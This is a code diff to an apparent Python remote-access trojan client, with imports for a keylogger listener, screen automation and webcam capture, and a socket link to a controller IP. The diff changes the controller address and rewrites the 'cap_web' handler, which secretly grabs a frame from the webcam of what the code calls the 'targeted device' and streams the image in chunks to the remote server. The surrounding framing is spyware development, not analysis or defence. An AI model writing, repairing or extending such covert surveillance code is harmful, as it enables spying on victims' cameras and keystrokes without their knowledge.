@@ -8,7 +8,8 @@ import pyttsx3
 import cv2
 import pyautogui
 from pynput.keyboard import Listener
-HOST = '192.168.0.141'
+
+HOST = '192.168.41.183'
 PORT = 5000
 
 def speak(audio):
@@ -163,35 +164,49 @@ while True:
 
     elif data.lower() == "cap_web":
         try:
+
             cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+
             time.sleep(2)
+
             ret, frame = cam.read()
-            if ret:
-                cv2.imwrite("selfie.png", frame)
-                send_to_server("Selfie saved as selfie.png")
-            else:
-                send_to_server("Failed to capture selfie. It can be for the targeted device doesn't have any web cam installed in his Machine")
+
+            if not ret:
+                send_to_server("Failed to capture selfie")
+                cam.release()
+                continue
+
+            filename = "selfie.png"
+
+            cv2.imwrite(filename, frame)
+
             cam.release()
-            imgname = "selfie.png"
-            imgsize = os.path.getsize(imgname)
-            client.send(f"SELFIE {imgname} {imgsize}".encode())
+            cv2.destroyAllWindows()
 
-            time.sleep(1)
+            filesize = os.path.getsize(filename)
 
-            with open(imgname, "rb") as f:
+            # SEND HEADER
+            header = f"SELFIE {filename} {filesize}\n"
+            client.send(header.encode())
+
+            time.sleep(0.5)
+
+            # SEND IMAGE
+            with open(filename, "rb") as f:
+
                 while True:
+
                     chunk = f.read(1024)
 
                     if not chunk:
                         break
 
-                    client.send(chunk)
-            send_to_server("Screenshot sent successfully!")
-            
-        
-        except:
-            send_to_server("Failed to capture selfie. It can be for the targeted device doesn't have any web cam installed in his Machine")
+                    client.sendall(chunk)
 
+            send_to_server("Selfie sent successfully!")
+
+        except Exception as e:
+            send_to_server(f"Webcam Error: {e}")
 
 
 
